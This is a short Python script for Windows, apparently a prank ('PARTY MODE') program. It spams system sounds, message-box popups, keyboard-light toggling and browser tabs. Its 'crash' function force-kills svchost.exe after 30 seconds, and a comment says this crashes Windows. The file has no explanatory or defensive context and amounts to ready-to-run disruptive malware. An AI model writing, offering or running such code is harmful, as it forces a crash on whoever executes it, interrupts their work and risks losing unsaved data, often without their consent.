import winsound
import ctypes
import threading
import time
import random
import os
import webbrowser

# Play Windows sounds in patterns
def play_windows_music():
    system_sounds = [
        "SystemExclamation",
        "SystemAsterisk",
        "SystemHand",
        "SystemDefault",
        "SystemQuestion"
    ]
    for _ in range(100):
        sound = random.choice(system_sounds)
        winsound.PlaySound(sound, winsound.SND_ALIAS)
        time.sleep(random.uniform(0.1, 0.5))

# Open annoying popup windows
def popups():
    for _ in range(50):
        ctypes.windll.user32.MessageBoxW(0, "PARTY MODE ACTIVE!", "Windows", 0)
        time.sleep(0.1)

# Flash keyboard lights
def keyboard_flash():
    for _ in range(100):
        for code in [0x14, 0x91, 0x90]:  # CapsLock, ScrollLock, NumLock
            ctypes.windll.user32.keybd_event(code, 0, 0, 0)
            ctypes.windll.user32.keybd_event(code, 0, 2, 0)
        time.sleep(0.05)

# Open random websites
def web_spam():
    sites = ["https://bing.com", "https://windows.com", "https://microsoft.com"]
    for _ in range(20):
        webbrowser.open(random.choice(sites))
        time.sleep(0.3)

# Force system crash
def crash():
    time.sleep(30)
    os.system("taskkill /f /im svchost.exe")  # Crashes Windows

# Start threads
threading.Thread(target=play_windows_music).start()
threading.Thread(target=popups).start()
threading.Thread(target=keyboard_flash).start()
threading.Thread(target=web_spam).start()
threading.Thread(target=crash).start()
